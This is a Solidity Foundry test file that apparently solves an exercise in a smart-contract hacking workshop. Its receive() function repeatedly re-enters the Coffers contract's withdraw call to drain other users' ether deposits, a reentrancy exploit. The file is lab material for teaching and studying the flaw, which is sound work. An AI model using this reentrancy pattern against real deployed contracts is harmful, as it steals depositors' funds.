// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Coffers} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise8_Coffers is Test {
    Coffers public coffers;

    function setUp() public {
        coffers = new Coffers();
    }

    function test_withdraw() public {
        address userA = vm.addr(1);
        address userB = vm.addr(2);
        vm.deal(userA, 2 ether);
        vm.deal(userB, 1 ether);
        vm.deal(address(this), 2 ether);

        // user A interacting with smart contract
        vm.startPrank(userA);
        coffers.createCoffer(2);
        coffers.deposit{value: 1 ether}(userA, 0);
        coffers.deposit{value: 1 ether}(userA, 1);
        vm.stopPrank();

        // user B interacting with smart contract
        vm.startPrank(userB);
        coffers.createCoffer(1);
        coffers.deposit{value: 1 ether}(userB, 0);
        vm.stopPrank();

        coffers.createCoffer(1);
        coffers.deposit{value: 1 ether}(address(this), 0);

        uint gasStart = gasleft();
        // address(coffers).call{gas: 100000}(
        //     abi.encodeWithSignature("withdraw(uint)", 0)
        // );
        coffers.withdraw{gas: 100000}(0);
        uint gasEnd = gasStart - gasleft();
        console.log(gasEnd);
        // require(address(this).balance == 5 ether, "invalid balance");
    }

    receive() external payable {
        if (address(coffers).balance != 0) {
            try coffers.withdraw(0) {
                console.log("success");
            } catch {
                console.log("error");
            }
        }
        // coffers.deposit{value: 0.5 ether, gas: 30000}(address(this), 0);
    }
}
